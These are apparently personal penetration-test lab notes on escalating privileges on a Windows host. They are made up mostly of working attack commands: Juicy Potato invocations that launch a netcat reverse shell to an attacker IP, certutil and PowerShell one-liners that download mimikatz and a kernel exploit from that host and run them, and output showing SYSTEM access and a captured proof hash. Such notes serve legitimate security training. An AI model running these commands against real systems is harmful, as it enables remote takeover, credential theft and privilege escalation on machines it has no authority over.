Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe -e cmd.exe 192.168.119.132 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}


```

```shell
#trying mimikatz
# did not work
certutil -urlcache -f http://192.168.119.132:80/mimikatz.exe

# trying to invoke
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.132/mimikatz.exe', 'mimikatz.exe')

echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.132:80/mimikatz.exe') | powershell -noprofile -
```

```shell
# trying kernel exploit

certutil.exe -urlcache -split -f "http://192.168.119.132/ms11.exe"


# xferred over kernel exploit
C:\wamp\www\PHP\folder\fileManager\collectives\DG0\folder>ms11.exe
ms11.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::4953:2482:19cf:44d9%14
   IPv4 Address. . . . . . . . . . . : 10.11.1.73
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.11.0.1

Tunnel adapter isatap.{F693EF91-E70D-4802-B995-EC715A8312A2}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 11:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\admin\Desktop>type proof.txt
type proof.txt
e18a24030ad7c23250b41c2fd257c71e 

C:\Users\admin\Desktop>


```


```shell
#lessons: IF YOU SEE A FUCKING KERNEL EXPLOIT JUST THROW IT. DO NOT BE FUCKING STUBBORN.
```

![[LAST PRROF.TXT.png]]

```shell
# followed this walkthrough to throw kernel exploit https://medium.com/@dw3113r/hack-the-box-devel-writeup-5a3a7e93df6a


```